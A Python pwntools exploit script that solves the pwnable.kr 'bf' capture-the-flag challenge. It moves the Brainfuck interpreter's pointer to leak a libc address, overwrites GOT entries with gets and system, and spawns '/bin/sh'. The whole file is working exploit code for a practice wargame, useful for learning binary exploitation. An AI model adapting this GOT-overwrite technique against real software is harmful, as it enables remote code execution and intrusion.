from pwn import *
conn = remote ('pwnable.kr',9001)
#conn = process('./bf')

print(conn)

a=conn.recvline()#'welcome to brainfuck testing system!!
print(a)
a=conn.recvline()#type some brainfuck instructions except [ ]
print(a)


# got.plt addresses
# 0x804a02c - memset
# 0x804a010 - fgets
# 0x804a030 - putchar, initialy points to 0x080484d6

_start_addr = 0x080484e0

# go back to base addr of function
# and also, the ',' waits for user input
# and set the current pointed byte according to user input.
# after we calculate the address we want to put we will send the address
# and then the function in the got.plt will point to the new one
ASSIGN_STR =',>,>,>,<<<'


leak_putchar = ('<'*(0x0804a0a0 - 0x0804a030) + '..>.>.>.<<<' + '>'*(0x0804a0a0 - 0x0804a030),b'putchar')
leak_memset  = ('<'*(0x0804a0a0 - 0x0804a02c) + '..>.>.>.<<<' + '>'*(0x0804a0a0 - 0x0804a02c),b'memset')
leak_fgets   = ('<'*(0x0804a0a0 - 0x0804a010) + '..>.>.>.<<<' + '>'*(0x0804a0a0 - 0x0804a010),b'fgets')

leaker = leak_fgets

payload = leaker[0]

# move to memset address
payload  += '<'*(0x0804a0a0 - 0x0804a02c)
payload  += ASSIGN_STR

#move the pointer to fgets
payload  += '<'*(0x0804a02c - 0x0804a010)
payload  += ASSIGN_STR

#move the pointer to putchar and prepare for overwrite
payload  += '>'*(0x804a030 - 0x0804a010)
payload  += ASSIGN_STR

# now we have to call putchar
payload  += '.'

conn.sendline(payload)

print(conn.recv(1))

leaker_abs = conn.recv(4)

libc = ELF('bf_libc.so')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')

leaker_offset = libc.symbols[leaker[1]]
libc_start = u32(leaker_abs) - leaker_offset

gets_abs_adress = libc_start + libc.symbols[b'gets']
system_abs_adress = libc_start + libc.symbols[b'system']

#using the ',' we padded got.plt's memset it will be
# set from user input we now send
conn.send(p32(gets_abs_adress))

#same for got.plt's fgets
conn.send(p32(system_abs_adress))

#same for _start_addr
conn.send(p32(_start_addr))

# at this point, we run the program from the
# beggining, but with a call to gets instead of memset, so, lets
# send it the shell:
conn.sendline('/bin/sh\x00')

conn.interactive()
